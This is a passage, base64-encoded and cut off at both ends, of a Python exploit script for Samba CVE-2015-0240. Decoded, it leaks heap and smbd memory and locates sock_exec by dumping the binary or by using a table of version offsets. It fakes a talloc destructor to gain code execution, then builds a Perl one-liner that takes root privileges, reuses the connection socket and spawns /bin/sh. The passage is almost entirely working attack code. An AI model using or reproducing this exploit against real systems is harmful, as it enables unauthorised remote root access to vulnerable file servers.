XJfYWRkciddIC0gMHgxMjQwMDANCiAgICBlbHNlOg0KICAgICAgICBzdGFydF9hZGRyID0gaW5mb1snc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyX2FkZHInXSAtIDB4MTMwMDAwDQogICAgc3RhcnRfYWRkciA9IHN0YXJ0X2FkZHIgJiAweGZmZmZmMDAwDQogICAgc3RvcF9hZGRyID0gc3RhcnRfYWRkciAtIDB4MjAwMDANCiAgICANCiAgICBwcmludCgnWypdIGZpbmRpbmcgc21iZCBsb2FkZWQgYWRkciAuLi4nKQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHNtYmRfYWRkciA9IHN0YXJ0X2FkZHINCiAgICAgICAgd2hpbGUgc21iZF9hZGRyID49IHN0b3BfYWRkcjoNCiAgICAgICAgICAgIGlmIGFkZHIydXRmX3ByZWZpeChzbWJkX2FkZHItOCkgPT0gMzoNCiAgICAgICAgICAgICAgICAjIHNtYmRfYWRkciBpcyAweGI/ZD9lMDAwDQogICAgICAgICAgICAgICAgdGVzdF9hZGRyID0gc21iZF9hZGRyIC0gMHg4MDAgLSA0DQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHRlc3RfYWRkciA9IHNtYmRfYWRkciAtIDgNCiAgICAgICAgICAgICMgdGVzdCB3cml0YWJsZSBvbiB0ZXN0X2FkZHINCiAgICAgICAgICAgIGFuc3dlcnMgPSBsZWFrX2luZm9fYWRkcihpbmZvWydwYXlsb2FkX2FkZHInXSwgMCwgdGVzdF9hZGRyLCByZXRyeT1GYWxzZSkNCiAgICAgICAgICAgIGlmIGFuc3dlcnMgaXMgbm90IE5vbmU6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHNtYmRfYWRkciAtPSAweDEwMDAgIyB0cnkgcHJldiBwYWdlDQogICAgICAgIGlmIHNtYmRfYWRkciA+IHN0b3BfYWRkcjoNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHByaW50KCcgWy1dIGZhaWxlZC4gdHJ5IGFnYWluLicpDQogICAgICAgIA0KICAgIGluZm9bJ3NtYmRfYWRkciddID0gc21iZF9hZGRyDQogICAgcHJpbnQoJyBbK10gZm91bmQgc21iZCBsb2FkZWQgYWRkcjogezp4fScuZm9ybWF0KHNtYmRfYWRkcikpDQoNCmRlZiBkdW1wX21lbV9jYWxsX2FkZHIoaW5mbywgdGFyZ2V0X2FkZHIpOg0KICAgICMgbGVhayBwaXBlc19zdHJ1Y3QgYWRkcmVzcyBmcm9tDQogICAgIyBzbWJkX3NlcnZlcl9jb25uZWN0aW9uLT5jaGFpbl9mc3AtPmZha2VfZmlsZV9oYW5kbGUtPnByaXZhdGVfZGF0YQ0KICAgICMgICAgICAgKG9mZnNldDogICAgICAgIC0+MHg0OCAgICAgLT4weGQ0ICAgICAgICAgICAgLT4weDQgKQ0KICAgICMgTm90ZToNCiAgICAjIC0gTVVTVCBOT1QgZGlzY29ubmVjdCBiZWNhdXNlIGNoYWluX2ZzcCxmYWtlX2ZpbGVfaGFuZGxlLHBpcGVzX3N0cnVjdCBhZGRyZXNzIHdpbGwgYmUgY2hhbmdlZA0KICAgICMgLSB0YXJnZXRfYWRkciB3aWxsIGJlIHJlcGxhY2VkIHdpdGggY3VycmVudF9wZHVfc2VudCBhZGRyZXNzDQogICAgIyBjaGVjayByZWFkX2Zyb21faW50ZXJuYWxfcGlwZSgpIGluIHNvdXJjZTMvcnBjX3NlcnZlci9zcnZfcGlwZV9obmQuYw0KICAgIHByaW50KCcgWypdIG92ZXJ3cml0ZSBjdXJyZW50X3BkdV9zZW50IGZvciBkdW1waW5nIG1lbW9yeSAuLi4nKQ0KICAgIGFuc3dlcnMgPSBsZWFrX2luZm9fYWRkcjIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGluZm9bJ3Jfb3V0X2FkZHInXSwgaW5mb1snc21iX3JlcXVlc3RfYWRkciddICsgMHg0OCkNCiAgICBpZiBhbnN3ZXJzIGlzIE5vbmU6DQogICAgICAgIHByaW50KCcgIFstXSBjYW5ub3QgbGVhayBjaGFpbl9mc3AgYWRkcmVzcyA6KCcpDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIGNoYWluX2ZzcF9hZGRyID0gYW5zd2Vyc1sxXQ0KICAgIHByaW50KCcgIFsqXSBjaGFpbl9mc3AgYWRkcjogezp4fScuZm9ybWF0KGNoYWluX2ZzcF9hZGRyKSkNCiAgICANCiAgICBhbnN3ZXJzID0gbGVha19pbmZvX2FkZHIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGluZm9bJ3Jfb3V0X2FkZHInXSwgY2hhaW5fZnNwX2FkZHIrMHhkNCwgcmV0cnk9RmFsc2UpDQogICAgaWYgYW5zd2VycyBpcyBOb25lOg0KICAgICAgICBwcmludCgnICBbLV0gY2Fubm90IGxlYWsgZmFrZV9maWxlX2hhbmRsZSBhZGRyZXNzIDooJykNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgZmFrZV9maWxlX2hhbmRsZV9hZGRyID0gYW5zd2Vyc1swXQ0KICAgIHByaW50KCcgIFsqXSBmYWtlX2ZpbGVfaGFuZGxlIGFkZHI6IHs6eH0nLmZvcm1hdChmYWtlX2ZpbGVfaGFuZGxlX2FkZHIpKQ0KDQogICAgYW5zd2VycyA9IGxlYWtfaW5mb19hZGRyMihpbmZvWydwYXlsb2FkX2FkZHInXSwgaW5mb1sncl9vdXRfYWRkciddLCBmYWtlX2ZpbGVfaGFuZGxlX2FkZHIrMHg0LTB4NCwgcmV0cnk9RmFsc2UpDQogICAgaWYgYW5zd2VycyBpcyBOb25lOg0KICAgICAgICBwcmludCgnICBbLV0gY2Fubm90IGxlYWsgcGlwZXNfc3RydWN0IGFkZHJlc3MgOignKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICBwaXBlc19zdHJ1Y3RfYWRkciA9IGFuc3dlcnNbMl0NCiAgICBwcmludCgnICBbKl0gcGlwZXNfc3RydWN0IGFkZHI6IHs6eH0nLmZvcm1hdChwaXBlc19zdHJ1Y3RfYWRkcikpDQogICAgDQogICAgY3VycmVudF9wZHVfc2VudF9hZGRyID0gcGlwZXNfc3RydWN0X2FkZHIrMHg4NA0KICAgIHByaW50KCcgIFsqXSBjdXJyZW50X3BkdV9zZW50IGFkZHI6IHs6eH0nLmZvcm1hdChjdXJyZW50X3BkdV9zZW50X2FkZHIpKQ0KICAgICMgY2hhbmdlIHBpcGVzLT5vdXRfZGF0YS5jdXJyZW50X3BkdV9zZW50IHRvIGR1bXAgbWVtb3J5DQogICAgcmV0dXJuIGxlYWtfaW5mb191bmxpbmsoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGN1cnJlbnRfcGR1X3NlbnRfYWRkci00LCB0YXJnZXRfYWRkciwgY2FsbF9vbmx5PVRydWUpDQoNCmRlZiBkdW1wX3NtYmRfZmluZF9iaW5pbmZvKGluZm8pOg0KICAgIGRlZiByZWN2X3RpbGxfc3RyaW5nKGRhdGEsIHMpOg0KICAgICAgICBwb3MgPSBsZW4oZGF0YSkNCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIGRhdGEgKz0gZm9yY2VfcmVjdigpDQogICAgICAgICAgICBpZiBsZW4oZGF0YSkgPT0gcG9zOg0KICAgICAgICAgICAgICAgIHByaW50KCdubyBtb3JlIGRhdGEgISEhJykNCiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQ0KICAgICAgICAgICAgcCA9IGRhdGEuZmluZChzLCBwb3MtbGVuKHMpKQ0KICAgICAgICAgICAgaWYgcCAhPSAtMToNCiAgICAgICAgICAgICAgICByZXR1cm4gKGRhdGEsIHApDQogICAgICAgICAgICBwb3MgPSBsZW4oZGF0YSkNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KICAgIGRlZiBsb29rdXBfZHluc3ltKGR5bnN5bSwgbmFtZV9vZmZzZXQpOg0KICAgICAgICBhZGRyID0gMA0KICAgICAgICBpID0gMA0KICAgICAgICBvZmZzZXRfc3RyID0gcGFjaygiPEkiLCBuYW1lX29mZnNldCkNCiAgICAgICAgd2hpbGUgaSA8IGxlbihkeW5zeW0pOg0KICAgICAgICAgICAgaWYgZHluc3ltW2k6aSs0XSA9PSBvZmZzZXRfc3RyOg0KICAgICAgICAgICAgICAgIGFkZHIgPSB1bnBhY2soIjxJIiwgZHluc3ltW2krNDppKzhdKVswXQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBpICs9IDE2DQogICAgICAgIHJldHVybiBhZGRyDQogICAgDQogICAgcHJpbnQoJ1sqXSBkdW1waW5nIHNtYmQgLi4uJykNCiAgICBkdW1wX2NhbGwgPSBGYWxzZQ0KICAgICMgaGF2ZSB0byBtaW51cyBmcm9tIHNtYmRfYWRkciBiZWNhdXNlIGNvZGUgc2VjdGlvbiBpcyByZWFkLW9ubHkNCiAgICBpZiBhZGRyMnV0Zl9wcmVmaXgoaW5mb1snc21iZF9hZGRyJ10tNCkgPT0gMzoNCiAgICAgICAgIyBzbWJkX2FkZHIgaXMgMHhiP2Q/ZTAwMA0KICAgICAgICBkdW1wX2FkZHIgPSBpbmZvWydzbWJkX2FkZHInXSAtIDB4ODAwIC0gNA0KICAgIGVsc2U6DQogICAgICAgIGR1bXBfYWRkciA9IGluZm9bJ3NtYmRfYWRkciddIC0gNA0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICBpZiBkdW1wX21lbV9jYWxsX2FkZHIoaW5mbywgZHVtcF9hZGRyKToNCiAgICAgICAgICAgIG1lbSA9IGZvcmNlX3JlY3YoKQ0KICAgICAgICAgICAgaWYgbGVuKG1lbSkgPT0gNDI4MDoNCiAgICAgICAgICAgICAgICBkdW1wX2NhbGwgPSBUcnVlDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgcHJpbnQoJyBbLV0gZHVtcF9tZW1fY2FsbF9hZGRyIGZhaWxlZC4gdHJ5IGFnYWluJykNCiAgICAgICAgZm9yY2VfZGNlX2Rpc2Nvbm5lY3QoKQ0KICAgIGlmIG5vdCBkdW1wX2NhbGw6DQogICAgICAgIHByaW50KCcgWy1dIGR1bXAgc21iZCBmYWlsZWQnKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICANCiAgICBwcmludCgnIFsrXSBkdW1wIHN1Y2Nlc3MuIGdldHRpbmcgc21iZCAuLi4nKQ0KICAgICMgZmlyc3QgdGltZSwgcmVtb3ZlIGFueSBkYXRhIGJlZm9yZSBcN2ZFTEYNCiAgICBtZW0gPSBtZW1bbWVtLmluZGV4KCdceDdmRUxGJyk6XQ0KDQogICAgbWVtLCBwb3MgPSByZWN2X3RpbGxfc3RyaW5nKG1lbSwgJ1x4MDBfX2dtb25fc3RhcnRfX1x4MDAnKQ0KICAgIHByaW50KCcgWypdIGZvdW5kIF9fZ21vbl9zdGFydF9fIGF0IHs6eH0nLmZvcm1hdChwb3MrMSkpDQogICAgDQogICAgcG9zID0gbWVtLnJmaW5kKCdceDAwXHgwMCcsIDAsIHBvcy0xKQ0KICAgIGR5bnN0cl9vZmZzZXQgPSBwb3MrMQ0KICAgIHByaW50KCcgWypdIGZvdW5kIC5keW5zdHIgc2VjdGlvbiBhdCB7Onh9Jy5mb3JtYXQoZHluc3RyX29mZnNldCkpDQogICAgDQogICAgZHluc3RyID0gbWVtW2R5bnN0cl9vZmZzZXQ6XQ0KICAgIG1lbSA9IG1lbVs6ZHluc3RyX29mZnNldF0NCiAgICANCiAgICAjIGZpbmQgc3RhcnQgb2YgLmR5bnN5bSBzZWN0aW9uDQogICAgcG9zID0gbGVuKG1lbSkgLSAxNg0KICAgIHdoaWxlIHBvcyA+IDA6DQogICAgICAgIGlmIG1lbVtwb3M6cG9zKzE2XSA9PSAnXHgwMCcqMTY6DQogICAgICAgICAgICBicmVhaw0KICAgICAgICBwb3MgLT0gMTYgIyBzeW0gZW50cnkgc2l6ZSBpcyAxNiBieXRlcw0KICAgIGlmIHBvcyA8PSAwOg0KICAgICAgICBwcmludCgnIFstXSBmb3VuZCB3cm9uZyAuZHluc3ltIHNlY3Rpb24gYXQgezp4fScuZm9ybWF0KHBvcykpDQogICAgICAgIHJldHVybiBOb25lDQogICAgZHluc3ltX29mZnNldCA9IHBvcw0KICAgIHByaW50KCcgWypdIGZvdW5kIC5keW5zeW0gc2VjdGlvbiBhdCB7Onh9Jy5mb3JtYXQoZHluc3ltX29mZnNldCkpDQogICAgZHluc3ltID0gbWVtW2R5bnN5bV9vZmZzZXQ6XQ0KICAgIA0KICAgICMgZmluZCBzb2NrX2V4ZWMNCiAgICBkeW5zdHIsIHBvcyA9IHJlY3ZfdGlsbF9zdHJpbmcoZHluc3RyLCAnXHgwMHNvY2tfZXhlY1x4MDAnKQ0KICAgIHByaW50KCcgWypdIGZvdW5kIHNvY2tfZXhlYyBzdHJpbmcgYXQgezp4fScuZm9ybWF0KHBvcysxKSkNCiAgICBzb2NrX2V4ZWNfb2Zmc2V0ID0gbG9va3VwX2R5bnN5bShkeW5zeW0sIHBvcysxKQ0KICAgIHByaW50KCcgWypdIHNvY2tfZXhlYyBvZmZzZXQgezp4fScuZm9ybWF0KHNvY2tfZXhlY19vZmZzZXQpKQ0KICAgICAgICANCiAgICAjaW5mb1snbWVtJ10gPSBtZW0gICMgc21iZCBkYXRhIGJlZm9yZSAuZHluc3ltIHNlY3Rpb24NCiAgICBpbmZvWydkeW5zeW0nXSA9IGR5bnN5bQ0KICAgIGluZm9bJ2R5bnN0ciddID0gZHluc3RyICMgaW5jb21wbGV0ZSBzZWN0aW9uDQogICAgaW5mb1snc29ja19leGVjX2FkZHInXSA9IGluZm9bJ3NtYmRfYWRkciddK3NvY2tfZXhlY19vZmZzZXQNCiAgICBwcmludCgnIFsrXSBzb2NrX2V4ZWMgYWRkcjogezp4fScuZm9ybWF0KGluZm9bJ3NvY2tfZXhlY19hZGRyJ10pKQ0KICAgIA0KICAgICMgTm90ZTogY2FuIGNvbnRpbnVpbmcgbWVtb3J5IGR1bXAgdG8gZmluZCBST1ANCiAgICANCiAgICBmb3JjZV9kY2VfZGlzY29ubmVjdCgpDQogICAgDQojIyMjIyMjIw0KIyBjb2RlIGV4ZWN1dGlvbg0KIyMjIyMjIyMNCmRlZiBjYWxsX3NvY2tfZXhlYyhpbmZvKToNCiAgICBwcmVmaXhfbGVuID0gYWRkcjJ1dGZfcHJlZml4KGluZm9bJ3NvY2tfZXhlY19hZGRyJ10pDQogICAgaWYgcHJlZml4X2xlbiA9PSAzOg0KICAgICAgICByZXR1cm4gRmFsc2UgIyB0b28gYmFkLi4uIGNhbm5vdCBjYWxsDQogICAgaWYgcHJlZml4X2xlbiA9PSAyOg0KICAgICAgICBwcmVmaXhfbGVuID0gMA0KICAgIGZha2VfdGFsbG9jX2NodW5rX2V4ZWMgPSBwYWNrKCI8SUlJSUlJSUlJSUlJIiwNCiAgICAgICAgMCwgMCwgIyBuZXh0LCBwcmV2DQogICAgICAgIDAsIDAsICAjIHBhcmVudCwgY2hpbGQNCiAgICAgICAgMCwgIyByZWZzDQogICAgICAgIGluZm9bJ3NvY2tfZXhlY19hZGRyJ10sICMgZGVzdHJ1Y3Rvcg0KICAgICAgICAwLCAwLCAjIG5hbWUsIHNpemUNCiAgICAgICAgVEFMTE9DX01BR0lDIHwgVEFMTE9DX0ZMQUdfUE9PTCwgIyBmbGFnDQogICAgICAgIDAsIDAsIDAsICMgcG9vbCwgcGFkLCBwYWQNCiAgICApDQogICAgY2h1bmsgPSAnXHgwMCcqcHJlZml4X2xlbitmYWtlX3RhbGxvY19jaHVua19leGVjICsgaW5mb1snY21kJ10gKyAnXHgwMCcNCiAgICBzZXRfcGF5bG9hZChjaHVuaywgVEFSR0VUX1BBWUxPQURfU0laRSkNCiAgICBmb3IgaSBpbiByYW5nZSgzKToNCiAgICAgICAgaWYgcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGluZm9bJ3BheWxvYWRfYWRkciddK1RBTExPQ19IRFJfU0laRStwcmVmaXhfbGVuKToNCiAgICAgICAgICAgIHByaW50KCd3YWl0aW5nIGZvciBzaGVsbCA6KScpDQogICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIHByaW50KCdzb21ldGhpbmcgd3JvbmcgOignKQ0KICAgIHJldHVybiBGYWxzZQ0KDQojIyMjIyMjIw0KIyBzdGFydCB3b3JrDQojIyMjIyMjIw0KDQpkZWYgY2hlY2tfZXhwbG9pdGFibGUoKToNCiAgICBpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoMHg0MTQxNDE0MSk6DQogICAgICAgIHByaW50KCdbLV0gc2VlbXMgbm90IHZ1bG5lcmFibGUnKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICBpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoMCk6DQogICAgICAgIHByaW50KCdbK10gc2VlbXMgZXhwbG9pdGFibGUgOiknKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIA0KICAgIHByaW50KCJbLV0gc2VlbXMgdnVsbmVyYWJsZSBidXQgSSBjYW5ub3QgZXhwbG9pdCIpDQogICAgcHJpbnQoIlstXSBJIGNhbiBleHBsb2l0IG9ubHkgaWYgJ2NyZWRzJyBpcyBjb250cm9sbGVkIGJ5ICdSZWZlcmVudElkJyIpDQogICAgcmV0dXJuIEZhbHNlDQoNCmRlZiBkb193b3JrKGFyZ3MpOg0KICAgIGluZm8gPSB7fQ0KICAgIA0KICAgIGlmIG5vdCAoYXJncy5wYXlsb2FkX2FkZHIgb3IgYXJncy5oZWFwX3N0YXJ0IG9yIGFyZ3Muc3RhcnRfcGF5bG9hZF9zaXplKToNCiAgICAgICAgaWYgbm90IGNoZWNrX2V4cGxvaXRhYmxlKCk6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgIHN0YXJ0X3NpemUgPSA1MTIqMTAyNCAjIGRlZmF1bHQgc2l6ZSB3aXRoIDUxMktCDQogICAgaWYgYXJncy5wYXlsb2FkX2FkZHI6DQogICAgICAgIGluZm9bJ3BheWxvYWRfYWRkciddID0gYXJncy5wYXlsb2FkX2FkZHINCiAgICBlbHNlOg0KICAgICAgICBoZWFwX3N0YXJ0ID0gYXJncy5oZWFwX3N0YXJ0IGlmIGFyZ3MuaGVhcF9zdGFydCBlbHNlIDB4Yjk4MDAwMDArMHgzMDAwMA0KICAgICAgICBpZiBhcmdzLnN0YXJ0X3BheWxvYWRfc2l6ZToNCiAgICAgICAgICAgIHN0YXJ0X3NpemUgPSBhcmdzLnN0YXJ0X3BheWxvYWRfc2l6ZSAqIDEwMjQNCiAgICAgICAgaWYgc3RhcnRfc2l6ZSA8IFRBUkdFVF9QQVlMT0FEX1NJWkU6DQogICAgICAgICAgICBzdGFydF9zaXplID0gNTEyKjEwMjQgIyBiYWNrIHRvIGRlZmF1bHQNCiAgICAgICAgaW5mb1sncGF5bG9hZF9hZGRyJ10gPSBmaW5kX3BheWxvYWRfYWRkcihoZWFwX3N0YXJ0LCBzdGFydF9zaXplLCBUQVJHRVRfUEFZTE9BRF9TSVpFKQ0KICAgIA0KICAgICMgdGhlIHJlYWwgdGFsbG9jIGNodW5rIGFkZHJlc3MgdGhhdCBzdG9yZWQgdGhlIHJhdyBuZXRsb2dvbiBkYXRhDQogICAgIyBzZXJ2ZXJIYW5kbGUgMHgxMCBieXRlcy4gYWNjb3VudE5hbWUgMHhjIGJ5dGVzDQogICAgaW5mb1snY2h1bmtfYWRkciddID0gaW5mb1sncGF5bG9hZF9hZGRyJ10gLSAweDFjIC0gVEFMTE9DX0hEUl9TSVpFDQogICAgcHJpbnQoIlsrXSBjaHVuayBhZGRyOiB7Onh9Ii5mb3JtYXQoaW5mb1snY2h1bmtfYWRkciddKSkNCg0KICAgIHdoaWxlIG5vdCBsZWFrX2luZm9fZmluZF9vZmZzZXQoaW5mbyk6DQogICAgICAgICMgTm90ZTogZG8gaGVhcCBicnV0ZWZvcmNpbmcgYWdhaW4gc2VlbXMgdG8gYmUgbW9yZSBlZmZlY3RpdmUNCiAgICAgICAgIyBzdGFydCBmcm9tIHBheWxvYWRfYWRkciArIHNvbWUgb2Zmc2V0DQogICAgICAgIHByaW50KCJbK10gYnJ1dGVmb3JjaW5nIGhlYXAgYWdhaW4uIHN0YXJ0IGZyb20gezp4fSIuZm9ybWF0KGluZm9bJ3BheWxvYWRfYWRkciddKzB4MTAwMDApKQ0KICAgICAgICBpbmZvWydwYXlsb2FkX2FkZHInXSA9IGZpbmRfcGF5bG9hZF9hZGRyKGluZm9bJ3BheWxvYWRfYWRkciddKzB4MTAwMDAsIHN0YXJ0X3NpemUsIFRBUkdFVF9QQVlMT0FEX1NJWkUpDQogICAgICAgIGluZm9bJ2NodW5rX2FkZHInXSA9IGluZm9bJ3BheWxvYWRfYWRkciddIC0gMHgxYyAtIFRBTExPQ19IRFJfU0laRQ0KICAgICAgICBwcmludCgiWytdIGNodW5rIGFkZHI6IHs6eH0iLmZvcm1hdChpbmZvWydjaHVua19hZGRyJ10pKQ0KDQogICAgZ290X2ZkID0gbGVha19zb2NrX2ZkKGluZm8pDQogICAgDQogICAgIyBjcmVhdGUgc2hlbGwgY29tbWFuZCBmb3IgcmV1c2Ugc29jayBmZA0KICAgIGNtZCA9ICJwZXJsIC1lICd1c2UgUE9TSVggcXcoZHVwMik7JCk9MDskPj0wOyIgICMgc2V0ZXVpZCwgc2V0ZWdpZA0KICAgIGNtZCArPSAiZHVwMih7MDpkfSwwKTtkdXAyKHswOmR9LDEpO2R1cDIoezA6ZH0sMik7Ii5mb3JtYXQoaW5mb1snc29ja19mZCddKSAjIGR1cCBzb2NrDQogICAgIyBoYXZlIHRvIGtpbGwgZ3JhbmQtZ3JhbmQtcGFyZW50IHByb2Nlc3MgYmVjYXVzZSBzb2NrX2V4ZWMoKSBkb2VzIGZvcmsoKSB0aGVuIHN5c3RlbSgpDQogICAgIyB0aGUgc21iZCBwcm9jZXNzIHN0aWxsIHJlY2VpdmluZyBkYXRhIGZyb20gc29ja2V0DQogICAgY21kICs9ICIkej1nZXRwcGlkOyR5PWBwcyAtbyBwcGlkPSAkemA7JHg9YHBzIC1vIHBwaWQ9ICR5YDtraWxsIDE1LCR4LCR5LCR6OyIgICMga2lsbCBwYXJlbnRzDQogICAgY21kICs9ICIiInByaW50ICJzaGVsbCByZWFkeVxuIjtleGVjICIvYmluL3NoIjsnIiIiICAjIHNwYXduIHNoZWxsDQogICAgaW5mb1snY21kJ10gPSBjbWQNCg0KICAgICMgTm90ZTogY2Fubm90IHVzZSBzeXN0ZW1AcGx0IGJlY2F1c2UgYmluYXJ5IGlzIFBJRSBhbmQgY2h1bmsgZHRvciBpcyBjYWxsZWQgaW4gbGlidGFsbG9jLg0KICAgICMgICAgICAgdGhlIGVieCBpcyBub3QgY29ycmVjdCBmb3IgcmVzb2x2aW5nIHRoZSBzeXN0ZW0gYWRkcmVzcw0KICAgIHNtYmRfaW5mbyA9IHsNCiAgICAgICAgMHg1ZGQ6IHsgJ3VpbnQ4dF9vZmZzZXQnOiAweDcxMTU1NSwgJ3RhbGxvY19wb3AnOiAweDQxYTg5MCwgJ3NvY2tfZXhlYyc6IDB4MDA0NGEwNjAsICd2ZXJzaW9uJzogJzMuNi4zLTJ1YnVudHUyIC0gMy42LjMtMnVidW50dTIuMyd9LA0KICAgICAgICAweGI3ZDogeyAndWludDh0X29mZnNldCc6IDB4NzExYjdkLCAndGFsbG9jX3BvcCc6IDB4NDFhYjgwLCAnc29ja19leGVjJzogMHgwMDQ0YTM4MCwgJ3ZlcnNpb24nOiAnMy42LjMtMnVidW50dTIuOSd9LA0KICAgICAgICAweGY3ZDogeyAndWludDh0X29mZnNldCc6IDB4NzEwZjdkLCAndGFsbG9jX3BvcCc6IDB4NDE5ZjgwLCAnc29ja19leGVjJzogMHgwMDQ0OTc3MCwgJ3ZlcnNpb24nOiAnMy42LjMtMnVidW50dTIuMTEnfSwNCiAgICAgICAgMHhmMWQ6IHsgJ3VpbnQ4dF9vZmZzZXQnOiAweDcxZmYxZCwgJ3RhbGxvY19wb3AnOiAweDQyOWU4MCwgJ3NvY2tfZXhlYyc6IDB4MDA0NjE0YjAsICd2ZXJzaW9uJzogJzMuNi42LTYrZGViN3U0J30sDQogICAgfQ0KDQogICAgbGVha190YWxsb2NfcG9wX2FkZHIoaW5mbykgICMgdG8gZG91YmxlIGNoZWNrIHRoZSBiaW5pbmZvDQogICAgYmluaW5mbyA9IHNtYmRfaW5mby5nZXQoaW5mb1sndWludDh0X2FkZHInXSAmIDB4ZmZmKQ0KICAgIGlmIGJpbmluZm8gaXMgbm90IE5vbmU6DQogICAgICAgIHNtYmRfYWRkciA9IGluZm9bJ3VpbnQ4dF9hZGRyJ10gLSBiaW5pbmZvWyd1aW50OHRfb2Zmc2V0J10NCiAgICAgICAgaWYgc21iZF9hZGRyICsgYmluaW5mb1sndGFsbG9jX3BvcCddID09IGluZm9bJ3RhbGxvY19wb3BfYWRkciddOg0KICAgICAgICAgICAgIyBjb3JyZWN0IGluZm8NCiAgICAgICAgICAgIHByaW50KCdbK10gZGV0ZWN0IHNtYmQgdmVyc2lvbjogezpzfScuZm9ybWF0KGJpbmluZm9bJ3ZlcnNpb24nXSkpDQogICAgICAgICAgICBpbmZvWydzbWJkX2FkZHInXSA9IHNtYmRfYWRkcg0KICAgICAgICAgICAgaW5mb1snc29ja19leGVjX2FkZHInXSA9IHNtYmRfYWRkciArIGJpbmluZm9bJ3NvY2tfZXhlYyddDQogICAgICAgICAgICBwcmludCgnIFsqXSBzbWJkIGxvYWRlZCBhZGRyOiB7Onh9Jy5mb3JtYXQoc21iZF9hZGRyKSkNCiAgICAgICAgICAgIHByaW50KCcgWypdIHVzZSBzb2NrX2V4ZWMgb2Zmc2V0OiB7Onh9Jy5mb3JtYXQoYmluaW5mb1snc29ja19leGVjJ10pKQ0KICAgICAgICAgICAgcHJpbnQoJyBbKl0gc29ja19leGVjIGFkZHI6IHs6eH0nLmZvcm1hdChpbmZvWydzb2NrX2V4ZWNfYWRkciddKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICMgd3JvbmcgaW5mbw0KICAgICAgICAgICAgYmluaW5mbyA9IE5vbmUNCiAgICAgICAgDQogICAgZ290X3NoZWxsID0gRmFsc2UNCiAgICBpZiBiaW5pbmZvIGlzIE5vbmU6DQogICAgICAgICMgbm8gdGFyZ2V0IGJpbmFyeSBpbmZvLiBkbyBhIGhhcmQgd2F5IHRvIGZpbmQgdGhlbS4NCiAgICAgICAgIiIiDQogICAgICAgIGxlYWsgc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyIGZvciAyIHB1cnBvc2VzDQogICAgICAgIC0gdG8gY2hlY2sgaWYgY29tcGlsZXIgZG9lcyBjb2RlIGFsaWdubWVudA0KICAgICAgICAtIHRvIGVzdGltYXRlIHNtYmQgbG9hZGVkIGFkZHJlc3MNCiAgICAgICAgICAtIGdjYyBhbHdheXMgcHV0cyBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXIoKSBmdW5jdGlvbiBhdA0KICAgICAgICAgICAgYmVnaW5uaW5nIGFyZWEgb2YgLnRleHQgc2VjdGlvbg0KICAgICAgICAgIC0gc28gdGhlIGRpZmZlcmVuY2Ugb2Ygc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyKCkgb2Zmc2V0IGlzDQogICAgICAgICAgICB2ZXJ5IGxvdyBmb3IgYWxsIHNtYmQgYmluYXJ5IChjb21waWxlZCBieSBnY2MpDQogICAgICAgICIiIiAgIA0KICAgICAgICBsZWFrX3NtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlcl9hZGRyKGluZm8pDQogICAgICAgIGZpbmRfc21iZF9iYXNlX2FkZHIoaW5mbykNCiAgICAgICAgZHVtcF9zbWJkX2ZpbmRfYmluaW5mbyhpbmZvKQ0KDQogICAgIyBjb2RlIGV4ZWN1dGlvbg0KICAgIGlmICdzb2NrX2V4ZWNfYWRkcicgaW4gaW5mbyBhbmQgY2FsbF9zb2NrX2V4ZWMoaW5mbyk6DQogICAgICAgIHMgPSBnZXRfc29ja2V0KCkNCiAgICAgICAgcHJpbnQocy5yZWN2KDQwOTYpKSAjIHdhaXQgZm9yICdzaGVsbCByZWFkeScgbWVzc2FnZQ0KICAgICAgICBzLnNlbmQoJ3VuYW1lIC1hXG4nKQ0KICAgICAgICBwcmludChzLnJlY3YoNDA5NikpDQogICAgICAgIHMuc2VuZCgnaWRcbicpDQogICAgICAgIHByaW50KHMucmVjdig0MDk2KSkNCiAgICAgICAgcy5zZW5kKCdleGl0XG4nKQ0KICAgICAgICBzLmNsb3NlKCkNCg0KDQpkZWYgaGV4X2ludCh4KToNCiAgICByZXR1cm4gaW50KHgsMTYpDQogICAgDQojIGNvbW1hbmQgYXJndW1lbnRzDQpwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbj0nU2FtYmEgQ1ZFLTIwMTUtMDI0MCBleHBsb2l0JykNCnBhcnNlci5hZGRfYXJndW1lbnQoJ3RhcmdldCcsIGhlbHA9J3RhcmdldCBJUCBhZGRyZXNzJykNCnBhcnNlci5hZGRfYXJndW1lbnQoJy1ocycsICctLWhlYXBfc3RhcnQnLCB0eXBlPWhleF9pbnQsDQogICAgICAgICAgICBoZWxwPSdoZWFwIGFkZHJlc3MgaW4gaGV4IHRvIHN0YXJ0IGJydXRlZm9yY2luZycpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctcGEnLCAn